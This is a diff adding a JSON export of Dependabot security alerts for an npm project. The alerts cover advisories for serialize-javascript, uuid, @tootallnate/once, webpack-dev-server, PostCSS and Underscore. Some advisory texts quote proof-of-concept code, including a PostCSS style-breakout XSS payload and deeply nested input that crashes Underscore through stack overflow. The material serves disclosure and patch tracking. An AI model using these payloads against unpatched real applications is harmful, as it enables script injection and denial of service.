+            "name": "@opentelemetry/core"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "< 2.8.0",
+          "first_patched_version": {
+            "identifier": "2.8.0"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "score": 5.3
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00344,
+        "percentile": 0.27528
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 5.3
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@opentelemetry/core"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "< 2.8.0",
+      "first_patched_version": {
+        "identifier": "2.8.0"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/13",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/13",
+    "created_at": "2026-08-21T01:04:41Z",
+    "updated_at": "2026-08-21T01:04:41Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": "2026-08-21T01:04:41Z"
+  },
+  {
+    "number": 12,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "serialize-javascript"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-qj8w-gfj5-8c6v",
+      "cve_id": "CVE-2026-34043",
+      "summary": "Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects",
+      "description": "### Impact\n\n**What kind of vulnerability is it?**\n\nIt is a **Denial of Service (DoS)** vulnerability caused by CPU exhaustion. When serializing a specially crafted \"array-like\" object (an object that inherits from `Array.prototype` but has a very large `length` property), the process enters an intensive loop that consumes 100% CPU and hangs indefinitely.\n\n**Who is impacted?**\n\nApplications that use `serialize-javascript` to serialize untrusted or user-controlled objects are at risk. While direct exploitation is difficult, it becomes a high-priority threat if the application is also vulnerable to **Prototype Pollution** or handles untrusted data via **YAML Deserialization**, as these could be used to inject the malicious object.\n\n### Patches\n\n**Has the problem been patched?**\n\nYes, the issue has been patched by replacing `instanceof Array` checks with `Array.isArray()` and using `Object.keys()` for sparse array detection.\n\n**What versions should users upgrade to?**\n\nUsers should upgrade to **`v7.0.5`** or later.\n\n### Workarounds\n\n**Is there a way for users to fix or remediate the vulnerability without upgrading?**\n\nThere is no direct code-level workaround within the library itself. However, users can mitigate the risk by:\n\n* Validating and sanitizing all input before passing it to the `serialize()` function.\n* Ensuring the environment is protected against Prototype Pollution.\n* Upgrading to **`v7.0.5`** as soon as possible.\n\n### Acknowledgements\n\nSerialize JavaScript thanks **Tomer Aberbach** (@TomerAberbach) for discovering and privately disclosing this issue.",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-qj8w-gfj5-8c6v",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-34043",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-qj8w-gfj5-8c6v"
+        },
+        {
+          "url": "https://github.com/yahoo/serialize-javascript/commit/f147e90269b58bb6e539cfdf3d0e20d6ad14204b"
+        },
+        {
+          "url": "https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.5"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34043"
+        },
+        {
+          "url": "https://github.com/yahoo/serialize-javascript/releases/tag/v5.0.0"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-qj8w-gfj5-8c6v"
+        }
+      ],
+      "published_at": "2026-03-27T18:18:54Z",
+      "updated_at": "2026-05-21T18:30:15Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "serialize-javascript"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": ">= 5.0.0, < 7.0.5",
+          "first_patched_version": {
+            "identifier": "7.0.5"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 5.9
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00472,
+        "percentile": 0.385
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 5.9
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        },
+        {
+          "cwe_id": "CWE-834",
+          "name": "Excessive Iteration"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "serialize-javascript"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": ">= 5.0.0, < 7.0.5",
+      "first_patched_version": {
+        "identifier": "7.0.5"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/12",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/12",
+    "created_at": "2026-08-21T01:04:41Z",
+    "updated_at": "2026-08-21T01:04:41Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 11,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "uuid"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-w5hq-g745-h8pq",
+      "cve_id": "CVE-2026-41907",
+      "summary": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "description": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-w5hq-g745-h8pq",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-41907",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/releases/tag/v14.0.0"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41907"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/releases/tag/v11.1.1"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/releases/tag/v12.0.1"
+        },
+        {
+          "url": "https://github.com/uuidjs/uuid/releases/tag/v13.0.1"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+        }
+      ],
+      "published_at": "2026-04-22T20:53:24Z",
+      "updated_at": "2026-05-21T18:25:57Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "uuid"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": ">= 12.0.0, < 12.0.1",
+          "first_patched_version": {
+            "identifier": "12.0.1"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "uuid"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": ">= 13.0.0, < 13.0.1",
+          "first_patched_version": {
+            "identifier": "13.0.1"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "uuid"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "< 11.1.1",
+          "first_patched_version": {
+            "identifier": "11.1.1"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+          "score": 6.3
+        }
+      },
+      "epss": {
+        "percentage": 0.00337,
+        "percentile": 0.26518
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+        "score": 7.5
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        },
+        {
+          "cwe_id": "CWE-1285",
+          "name": "Improper Validation of Specified Index, Position, or Offset in Input"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "uuid"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "< 11.1.1",
+      "first_patched_version": {
+        "identifier": "11.1.1"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/11",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/11",
+    "created_at": "2026-08-21T01:04:41Z",
+    "updated_at": "2026-08-21T01:04:41Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 10,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@tootallnate/once"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-vpq2-c234-7xj6",
+      "cve_id": "CVE-2026-3449",
+      "summary": "@tootallnate/once vulnerable to Incorrect Control Flow Scoping",
+      "description": "Versions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in a permanently pending state after the signal is aborted, causing any await or .then() usage to hang indefinitely. This can cause a control-flow leak that can lead to stalled requests, blocked workers, or degraded application availability.",
+      "severity": "low",
+      "identifiers": [
+        {
+          "value": "GHSA-vpq2-c234-7xj6",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-3449",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-3449"
+        },
+        {
+          "url": "https://github.com/TooTallNate/once/issues/8"
+        },
+        {
+          "url": "https://github.com/TooTallNate/once/commit/b9f43cc5259bee2952d91ad3cdbd201a82df448a"
+        },
+        {
+          "url": "https://security.snyk.io/vuln/SNYK-JS-TOOTALLNATEONCE-15250612"
+        },
+        {
+          "url": "https://github.com/TooTallNate/once/releases/tag/v2.0.1"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-vpq2-c234-7xj6"
+        }
+      ],
+      "published_at": "2026-03-03T06:31:14Z",
+      "updated_at": "2026-05-21T16:55:50Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "@tootallnate/once"
+          },
+          "severity": "low",
+          "vulnerable_version_range": ">= 3.0.0, < 3.0.1",
+          "first_patched_version": {
+            "identifier": "3.0.1"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "@tootallnate/once"
+          },
+          "severity": "low",
+          "vulnerable_version_range": "< 2.0.1",
+          "first_patched_version": {
+            "identifier": "2.0.1"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L",
+          "score": 3.3
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
+          "score": 1.9
+        }
+      },
+      "epss": {
+        "percentage": 0.00112,
+        "percentile": 0.01633
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L",
+        "score": 3.3
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-705",
+          "name": "Incorrect Control Flow Scoping"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@tootallnate/once"
+      },
+      "severity": "low",
+      "vulnerable_version_range": "< 2.0.1",
+      "first_patched_version": {
+        "identifier": "2.0.1"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/10",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/10",
+    "created_at": "2026-08-21T01:04:41Z",
+    "updated_at": "2026-08-21T01:04:41Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 9,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-79cf-xcqc-c78w",
+      "cve_id": "CVE-2026-6402",
+      "summary": "webpack-dev-server vulnerable to cross-origin source code exposure on non-HTTPS origins",
+      "description": "### Impact\n\nWhen webpack-dev-server is running on a non-HTTPS origin (the default), cross-origin requests from malicious websites can load the dev server's JavaScript bundles via `<script>` tags. The fix introduced in v5.2.1 (CVE-2025-30359) relied on `Sec-Fetch-Mode` and `Sec-Fetch-Site` request headers to block these requests, but browsers only send these headers for [potentially trustworthy origins](https://w3c.github.io/webappsec-secure-contexts/#is-origin-trustworthy). Over plain HTTP, the headers are absent and the check is bypassed.\n\nAn attacker who knows the dev server's host, port, and output path can exfiltrate all module source code by intercepting the webpack runtime's module registration.\n\nThis does not affect Chrome 142+ (and other Chromium-based browsers) due to [local network access restrictions](https://developer.chrome.com/release-notes/142#local_network_access_restrictions).\n\n### Patches\n\nPatched in webpack-dev-server >= 5.2.4 by setting `Cross-Origin-Resource-Policy: same-origin` on responses.\n\n### Workarounds\n\nRun the dev server with HTTPS enabled (`--https` or `server.type: 'https'` in config).\n\n### Resources\n\n- [GHSA-4v9v-hfq4-rm2v](https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v) (CVE-2025-30359) - original vulnerability\n- [GHSA-9jgg-88mc-972h](https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h) (CVE-2025-30360) - prior bypass",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-79cf-xcqc-c78w",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-6402",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-79cf-xcqc-c78w"
+        },
+        {
+          "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-6402"
+        },
+        {
+          "url": "https://cna.openjsf.org/security-advisories.html"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-79cf-xcqc-c78w"
+        }
+      ],
+      "published_at": "2026-05-18T13:31:42Z",
+      "updated_at": "2026-05-18T13:31:44Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "webpack-dev-server"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "<= 5.2.3",
+          "first_patched_version": {
+            "identifier": "5.2.4"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "score": 5.3
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00216,
+        "percentile": 0.11863
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+        "score": 5.3
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-749",
+          "name": "Exposed Dangerous Method or Function"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "webpack-dev-server"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "<= 5.2.3",
+      "first_patched_version": {
+        "identifier": "5.2.4"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/9",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/9",
+    "created_at": "2026-08-21T01:04:41Z",
+    "updated_at": "2026-08-21T01:04:41Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 8,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-qx2v-qp2m-jg93",
+      "cve_id": "CVE-2026-41305",
+      "summary": "PostCSS has XSS via Unescaped </style> in its CSS Stringify Output",
+      "description": "# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output\n\n## Summary\n\nPostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.\n\n## Proof of Concept\n\n```javascript\nconst postcss = require('postcss');\n\n// Parse user CSS and re-stringify for page embedding\nconst userCSS = 'body { content: \"</style><script>alert(1)</script><style>\"; }';\nconst ast = postcss.parse(userCSS);\nconst output = ast.toResult().css;\nconst html = `<style>${output}</style>`;\n\nconsole.log(html);\n// <style>body { content: \"</style><script>alert(1)</script><style>\"; }</style>\n//\n// Browser: </style> closes the style tag, <script> executes\n```\n\n**Tested output** (Node.js v22, postcss v8.5.5):\n```\nInput: body { content: \"</style><script>alert(1)</script><style>\"; }\nOutput: body { content: \"</style><script>alert(1)</script><style>\"; }\nContains </style>: true\n```\n\n## Impact\n\nImpact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.\n\n## Suggested Fix\n\nEscape `</style` in all stringified output values:\n```javascript\noutput = output.replace(/<\\/(style)/gi, '<\\\\/$1');\n```\n\n## Credits\nDiscovered and reported by [Sunil Kumar](https://tharvid.in) ([@TharVid](https://github.com/TharVid))",
+      "severity": "medium",
+      "identifiers": [
+        {
+          "value": "GHSA-qx2v-qp2m-jg93",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-41305",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41305"
+        },
+        {
+          "url": "https://github.com/postcss/postcss/releases/tag/8.5.10"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-qx2v-qp2m-jg93"
+        }
+      ],
+      "published_at": "2026-04-24T15:31:42Z",
+      "updated_at": "2026-04-24T15:31:44Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "postcss"
+          },
+          "severity": "medium",
+          "vulnerable_version_range": "< 8.5.10",
+          "first_patched_version": {
+            "identifier": "8.5.10"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "score": 6.1
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00205,
+        "percentile": 0.10535
+      },
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "score": 6.1
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-79",
+          "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+        }
+      ],
+      "classification": "general"
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "postcss"
+      },
+      "severity": "medium",
+      "vulnerable_version_range": "< 8.5.10",
+      "first_patched_version": {
+        "identifier": "8.5.10"
+      }
+    },
+    "url": "https://api.github.com/repos/pakshith33/tech-titans-tracker/dependabot/alerts/8",
+    "html_url": "https://github.com/pakshith33/tech-titans-tracker/security/dependabot/8",
+    "created_at": "2026-08-21T01:04:40Z",
+    "updated_at": "2026-08-21T01:04:40Z",
+    "dismissal_request": null,
+    "assignees": [
+
+    ],
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 7,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "npm",
+        "name": "underscore"
+      },
+      "manifest_path": "tech-titans-tracker/package-lock.json",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-qpx9-hpmf-5gmw",
+      "cve_id": "CVE-2026-27601",
+      "summary": "Underscore has unlimited recursion in _.flatten and _.isEqual, potential for DoS attack",
+      "description": "### Impact\n\nIn simple words, some programs that use `_.flatten` or `_.isEqual` could be made to crash. Someone who wants to do harm may be able to do this on purpose. This can only be done if the program has special properties. It only works in Underscore versions up to 1.13.7. A more detailed explanation follows.\n\nIn affected versions of Underscore, the `_.flatten` and `_.isEqual` functions use recursion without a depth limit. Under very specific conditions, detailed below, an attacker could exploit this in a Denial of Service (DoS) attack by triggering a stack overflow.\n\nA proof of concept (PoC) for this type of attack with `_.isEqual`:\n\n```js\nconst _ = require('underscore');\n\n// build JSON string for nested object ~4500 levels deep\n// (for this to be an attack, the JSON would have to come from\n// a request or other untrusted input)\nlet json = '';\nfor (let i = 0; i < 4500; i++) json += '{\"n\":';\njson += '\"x\"';\nfor (let i = 0; i < 4500; i++) json += '}';\n\n// construct two distinct objects with equal shape from the above JSON\nconst a = JSON.parse(json);\nconst b = JSON.parse(json);\n\n_.isEqual(a, b); // RangeError: Maximum call stack size exceeded\n```\n\nA proof of concept (PoC) for this type of attack with `_.flatten`:\n\n```js\nconst _ = require('underscore');\n\n// build nested array ~4500 levels deep\n// (like with _.isEqual, this nested array would have to be sourced\n// from an untrusted external source for it to be an attack)\nlet nested = [];\nfor (let i = 0; i < 4500; i++) nested = [nested];\n\n_.flatten(nested); // RangeError: Maximum call stack size exceeded\n```\n\nAn application that crashes because of this can be restarted, so the bug is most relevant to applications for which continued operation is important, such as server applications. Furthermore, an application is only vulnerable to this type of attack if ALL of the following conditions are met:\n\n- Untrusted input must be used to create a recursive datastructure, for example using `JSON.parse`, with no enforced depth limit.\n- The datastructure thus created must be passed to `_.flatten` or `_.isEqual`.\n- In the case of `_.flatten`, the vulnerability can only be exploited if it is possible for a remote client to prepare a datastructure that consists of arrays at all levels AND if no finite depth limit is passed as the second argument to `_.flatten`.\n- In the case of `_.isEqual`, the vulnerability can only be exploited if there exists a code path in which two distinct datastructures that were submitted by the same remote client are compared using `_.isEqual`. For example, if a client submits data that are stored in a database, and the same client can later submit another datastructure that is then compared to the data that were saved in the database previously, OR if a client submits a single request, but its data are parsed twice, creating two non-identical but equivalent datastructures that are then compared.\n- Exceptions originating from the call to `_.flatten` or `_.isEqual`, as a result of a stack overflow, are not being caught.\n\nAll versions of Underscore up to and including 1.13.7 are affected by this weakness.\n\n### Patches\n\nThe problem has been patched in version 1.13.8. Upgrading to 1.13.8 or later completely prevents exploitation.\n\n**Note:** historically, there have been breaking changes in minor releases of Underscore, especially between versions 1.6 and 1.9. However, upgrading from version 1.9 or later to any later 1.x version should be feasible with little or no effort for all users.\n\n### Workarounds\n\nA workaround that works for both functions is to enforce a depth limit on the datastructure that is created from untrusted input. A limit of 1000 levels should prevent attacks from being successful on most systems. In systems with highly constrained hardware, we recommend lower limits, for example 100 levels.\n\nAnother possible workaround that only works for `_.flatten`, is to pass a second argument that limits the flattening depth to 1000 or less.\n\n### References\n\n- https://github.com/jashkenas/underscore/issues/3011\n- https://underscorejs.org/#1.13.8\n- https://underscorejs.org/#flatten\n- https://underscorejs.org/#isEqual",
+      "severity": "high",
+      "identifiers": [
+        {
+          "value": "GHSA-qpx9-hpmf-5gmw",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-27601",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/jashkenas/underscore/security/advisories/GHSA-qpx9-hpmf-5gmw"
+        },
+        {
+          "url": "https://github.com/jashkenas/underscore/issues/3011"
+        },
+        {
+          "url": "https://underscorejs.org/#1.13.8"
+        },
+        {
+          "url": "https://underscorejs.org/#flatten"
+        },
+        {
+          "url": "https://underscorejs.org/#isEqual"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27601"
+        },
+        {
+          "url": "https://github.com/jashkenas/underscore/commit/411e222eb0ca5d570cc4f6315c02c05b830ed2b4"
+        },
+        {
+          "url": "https://github.com/jashkenas/underscore/commit/a6e23ae9647461ec33ad9f92a2ecfc220eea0a84"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-qpx9-hpmf-5gmw"
+        }
+      ],
+      "published_at": "2026-03-03T17:46:06Z",
+      "updated_at": "2026-05-05T22:01:46Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "underscore"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 1.13.7",
+          "first_patched_version": {
+            "identifier": "1.13.8"
+          }
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 5.9
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.2
